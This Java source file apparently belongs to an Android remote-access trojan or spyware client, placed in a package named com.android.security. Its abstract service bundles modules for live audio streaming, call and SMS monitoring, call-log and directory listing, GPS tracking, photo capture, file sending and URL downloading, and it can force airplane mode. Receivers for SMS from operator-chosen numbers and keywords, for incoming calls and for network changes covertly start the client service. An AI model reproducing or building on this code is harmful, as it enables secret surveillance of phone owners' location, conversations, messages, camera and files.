package com.android.security;

import java.util.ArrayList;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.media.AudioRecord;
import android.media.AudioRecord.OnRecordPositionUpdateListener;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import com.android.security.library.AdvancedSystemInfo;
import com.android.security.library.AudioStreamer;
import com.android.security.library.CallLogLister;
import com.android.security.library.CallMonitor;
import com.android.security.library.DirLister;
import com.android.security.library.FileSender;
import com.android.security.library.GPSListener;
import com.android.security.library.PhotoTaker;
import com.android.security.library.SMSMonitor;
import com.android.security.library.SystemInfo;
import com.android.security.library.UrlDownloader;
import com.android.security.utils.Config;
 
public abstract class ClientListener extends Service implements OnRecordPositionUpdateListener, LocationListener {
	
	public abstract void handleData(int channel, byte[] data); // C'est THE methode à implémenter dans Client
	public abstract void sendData(int channel, byte[] data); // C'est THE methode à implémenter dans Client
	public abstract void sendInformation(String infos);
	public abstract void sendError(String error);
	
	public abstract void loadPreferences();
	
	public AudioStreamer audioStreamer;
	public CallMonitor callMonitor;
	public CallLogLister callLogLister;
	public DirLister dirLister ;
	public FileSender fileDownloader;
	public GPSListener gps;
	public PhotoTaker photoTaker ;
	public SystemInfo infos;
	public Toast toast ;
	public SMSMonitor smsMonitor ;
	public AdvancedSystemInfo advancedInfos;
	public UrlDownloader urlDownloader;
	public FileSender fileSender;
	
	boolean waitTrigger;
	ArrayList<String> authorizedNumbersCall;
	ArrayList<String> authorizedNumbersSMS;
	ArrayList<String> authorizedNumbersKeywords;
 
	protected boolean isConnected = true;
	
	
	
	public ClientListener() {
		super();
	    //IntentFilter filter = new IntentFilter("android.net.conn.CONNECTIVITY_CHANGE");
	    //registerReceiver(ConnectivityCheckReceiver, filter); //Il faudrait aussi le unregister quelquepart
	}
	
	public void onLocationChanged(Location location) {
		byte[] data = gps.encode(location);
		handleData(gps.getChannel(), data);
	}

	public void onProviderDisabled(String provider) {
		sendError("GPS desactivated");
	}

	public void onProviderEnabled(String provider) {
		sendInformation("GPS Activated");
	}

	public void onStatusChanged(String provider, int status, Bundle extras) {
		//We really don't care
	}
	
	public void setAirMode() {
		// TODO Auto-generated method stub
		Config.setAirplaneModeOn(getApplicationContext(), 1);
	}
	
	public void onPeriodicNotification(AudioRecord recorder) {
		//Log.i("AudioStreamer", "Audio Data received !");
		try {
			byte[] data = audioStreamer.getData();
			if(data != null)
				handleData(audioStreamer.getChannel(), data);
		}
		catch(NullPointerException e) {
			
		}
	}
	
	
	public void onMarkerReached(AudioRecord recorder) {
		sendError("Marker reached for audio streaming");
	}

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	
	 protected BroadcastReceiver SMSreceiver = new BroadcastReceiver() {
		 	
		 	private final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
		 
	        @Override
	        public void onReceive(Context context, Intent intent) {

			 	if(intent.getAction().equals(SMS_RECEIVED)) { //On vérifie que c'est bien un event de SMS_RECEIVED même si c'est obligatoirement le cas.
			 		Log.i("SMSReceived", "onReceive sms !");
			 		
					Bundle bundle = intent.getExtras();
					if (bundle != null) {
						Object[] pdus = (Object[]) bundle.get("pdus");
						 
						final SmsMessage[] messages = new SmsMessage[pdus.length];
						for (int i = 0; i < pdus.length; i++)  {
							 messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
						}
						if (messages.length > -1) {
							
							 final String messageBody = messages[0].getMessageBody();
							 final String phoneNumber = messages[0].getDisplayOriginatingAddress();
							 boolean found = false;
							 boolean foundk = false;
							if(authorizedNumbersCall != null) {
								found = false;
								foundk =false;
								for(String s: authorizedNumbersSMS) {
									if(s.equals(phoneNumber))
										found = true;
								}
								if(!found)
									return;
								if(authorizedNumbersKeywords != null) {
									for(String s: authorizedNumbersKeywords) {
										if(messageBody.contains(s))
											foundk = true;
									}
									if(!foundk)
										return;
								}
								Log.i("Client","Incoming call authorized");
							}
 							if(foundk){
 								
 							Intent serviceIntent = new Intent(context, Client.class); // On lance le service
							serviceIntent.setAction("SMSreceiver");
							context.startService(serviceIntent); 							
							}

						}
					}
			 	}
	        }
	 };
	
	 protected BroadcastReceiver Callreceiver = new BroadcastReceiver() {
		 private static final String TAG = "CallReceiver";
		 
		@Override
		public void onReceive(final Context context, final Intent intent) {
			Log.i(TAG, "Call state changed !");
			final String action = intent.getAction();
			
			if (action.equals(TelephonyManager.ACTION_PHONE_STATE_CHANGED)) {
				
				final String phoneState = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
				final String phoneNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
				
				if (phoneState.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
					Log.i(TAG,"Incoming call");
					
					if(authorizedNumbersCall != null) {
						boolean found = false;
						for(String s: authorizedNumbersCall) {
							if(s.equals(phoneNumber))
								found = true;
						}
						if(!found)
							return;
						Log.i(TAG,"Incoming call authorized");
					}

					Intent serviceIntent = new Intent(context, Client.class); // On lance le service
					serviceIntent.setAction("Callreceiver");
					context.startService(serviceIntent);
				}
				
			} else {// Default event code

				final String data = intent.getDataString();
				Log.i(TAG, "broadcast : action=" + action + ", data=" + data);

			}
		}

	 };
	 
	 
	public final BroadcastReceiver ConnectivityCheckReceiver = new BroadcastReceiver() {
		
		private String TAG = "ConnectivityReceiver";
		
	    @Override
	    public void onReceive(Context context, Intent intent) {
	        String type;
	        boolean state;
	
	        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
	        NetworkInfo TestCo = connectivityManager.getActiveNetworkInfo();
	        if(TestCo == null)
	        	state = false;
	        else
	        	state = true;
	        
			ConnectivityManager connMgr = (ConnectivityManager) context
					.getSystemService(Context.CONNECTIVITY_SERVICE);
			NetworkInfo networkInfo = connMgr.getActiveNetworkInfo();
	        if(networkInfo.getType() == ConnectivityManager.TYPE_WIFI)
	        	type = "WIFI";
	        else if(networkInfo.getType() == ConnectivityManager.TYPE_MOBILE)
	        	type = "3G";
	        else
	        	type = "OTHER";
	
	        if(!state){
	        	Log.w(TAG, "Connection is not Available "+type);
		    }
		    else {
		    	if(!isConnected) {  
					Intent serviceIntent = new Intent(context, Client.class); // On lance le service
					serviceIntent.setAction("ConnectivityCheckReceiver");
					context.startService(serviceIntent);
	        	}		    
		    }
	        isConnected = state;
	    }
	};
}
